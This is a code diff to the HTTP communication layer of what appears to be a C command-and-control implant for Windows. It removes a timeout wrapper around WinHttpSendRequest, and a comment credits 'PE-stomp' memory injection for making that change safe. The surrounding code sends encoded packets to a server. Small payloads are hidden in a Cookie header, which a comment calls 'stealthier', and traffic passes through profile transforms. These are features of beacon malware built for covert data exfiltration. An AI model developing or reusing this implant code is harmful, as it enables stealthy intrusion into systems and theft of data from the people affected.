@@ -44,10 +44,9 @@ BOOL http_init(void) {
     DBG("[http] HTTP/2 ALPN disabled (HTTP/1.1 only)");
 
     /*
-     * Set explicit timeouts to prevent indefinite blocking.
-     * NOTE: these do NOT cover the Schannel TLS handshake — that's handled
-     * by the send_request_with_timeout() wrapper below.
-     * Args: hSession, DNS resolve ms, connect ms, send ms, receive ms
+     * Set explicit timeouts.  Now that PE-stomp preserves PE structure,
+     * WinHTTP can create internal threads normally and these timeouts
+     * cover the full connection lifecycle including TLS handshake.
      */
     WinHttpSetTimeouts(g_hSession,
         5000,   /* DNS resolve: 5 seconds  */
@@ -72,102 +71,6 @@ static wchar_t *to_wide(const char *s) {
     wchar_t *w = (wchar_t *)malloc(len * sizeof(wchar_t));
     MultiByteToWideChar(CP_UTF8, 0, s, -1, w, len);
     return w;
-}
-
-/* ─── Timer-based WinHttpSendRequest with hard timeout ───
- *
- * WinHTTP's session/request-level timeouts do NOT cover the Schannel TLS
- * handshake.  WinHttpSendRequest can block indefinitely during the TLS
- * negotiation even with all timeout options set.
- *
- * Fix: arm a timer-queue timer that closes the request handle after a
- * deadline.  Closing the handle from the timer callback cancels the
- * pending WinHttpSendRequest (MSDN-guaranteed).  Uses Windows thread
- * pool internally — no explicit CreateThread needed.
- *
- * Race safety: the request handle is stored in a struct accessed via
- * InterlockedExchangePointer.  Whichever side (timer callback or caller)
- * atomically swaps it to NULL first "owns" the handle decision — the
- * other sees NULL and does nothing.
- */
-typedef struct {
-    volatile HINTERNET hRequest;
-} TimeoutCtx;
-
-static VOID CALLBACK _send_timeout_cb(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
-    if (!TimerOrWaitFired || !lpParam) return;
-    TimeoutCtx *ctx = (TimeoutCtx *)lpParam;
-    /* Atomically take the handle — if non-NULL, we own and close it */
-    HINTERNET h = (HINTERNET)InterlockedExchangePointer(
-        (volatile PVOID *)&ctx->hRequest, NULL);
-    if (h) {
-        WinHttpCloseHandle(h);
-    }
-}
-
-/*
- * Wrapper around WinHttpSendRequest that enforces a hard timeout.
- *
- * On timeout: the timer callback closes the handle, WinHttpSendRequest
- * unblocks with an error.  We set *phRequest = NULL so the caller
- * knows not to double-close.  Returns FALSE.
- */
-static BOOL send_request_with_timeout(
-    HINTERNET *phRequest,
-    LPCWSTR   pwszHeaders,  DWORD dwHeadersLen,
-    LPVOID    lpOptional,   DWORD dwOptionalLen,
-    DWORD     dwTotalLength,
-    DWORD     timeout_ms)
-{
-    /* Set up the timeout context */
-    TimeoutCtx tctx;
-    tctx.hRequest = *phRequest;
-
-    HANDLE hTimer = NULL;
-    BOOL timerOk = CreateTimerQueueTimer(
-        &hTimer, NULL,
-        _send_timeout_cb, &tctx,
-        timeout_ms,       /* fire after timeout_ms */
-        0,                /* period=0 → one-shot */
-        WT_EXECUTEONLYONCE
-    );
-
-    if (!timerOk) {
-        DWORD err = GetLastError();
-        DBG("[http] CreateTimerQueueTimer failed err=%u (0x%08X) — no timeout protection",
-            err, err);
-        /* Fall through to sync call without timeout — better than nothing */
-    }
-
-    /* This may block — the timer will cancel it by closing the handle */
-    BOOL result = WinHttpSendRequest(
-        *phRequest, pwszHeaders, dwHeadersLen,
-        lpOptional, dwOptionalLen, dwTotalLength, 0
-    );
-    DWORD sendError = result ? 0 : GetLastError();
-
-    /* Atomically reclaim the handle. If NULL, the timer already closed it. */
-    HINTERNET h = (HINTERNET)InterlockedExchangePointer(
-        (volatile PVOID *)&tctx.hRequest, NULL);
-
-    /* Delete the timer and wait for callback to finish (INVALID_HANDLE_VALUE
-     * blocks until the callback has completed if it's currently running). */
-    if (hTimer) {
-        DeleteTimerQueueTimer(NULL, hTimer, INVALID_HANDLE_VALUE);
-    }
-
-    if (h == NULL) {
-        /* Timer fired and closed the handle before we got here */
-        DBG("[http] WinHttpSendRequest TIMED OUT after %u ms", timeout_ms);
-        *phRequest = NULL;
-        SetLastError(12002);  /* ERROR_WINHTTP_TIMEOUT */
-        return FALSE;
-    }
-
-    /* We reclaimed the handle — timer didn't fire (or was deleted in time) */
-    if (!result)
-        SetLastError(sendError);
-    return result;
 }
 
 /* ─── Profile transforms ─── */
@@ -331,10 +234,9 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
             L"Content-Type: application/octet-stream", (DWORD)-1,
             WINHTTP_ADDREQ_FLAG_ADD);
         DBG("[http] calling WinHttpSendRequest (POST, %u bytes)...", b64_len);
-        ok = send_request_with_timeout(&hRequest,
+        ok = WinHttpSendRequest(hRequest,
                 WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                (LPVOID)b64_val, b64_len, b64_len,
-                15000);  /* 15s hard timeout */
+                (LPVOID)b64_val, b64_len, b64_len, 0);
     } else {
         /* Small payload: embed in Cookie header (stealthier) */
         char ck_name_dec[64];
@@ -351,10 +253,9 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
         free(cookie_hdr);
 
         DBG("[http] calling WinHttpSendRequest (GET+cookie)...");
-        ok = send_request_with_timeout(&hRequest,
+        ok = WinHttpSendRequest(hRequest,
                 WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                WINHTTP_NO_REQUEST_DATA, 0, 0,
-                15000);  /* 15s hard timeout */
+                WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     }
     DBG("[http] WinHttpSendRequest returned ok=%d", ok);
     free(b64_val);
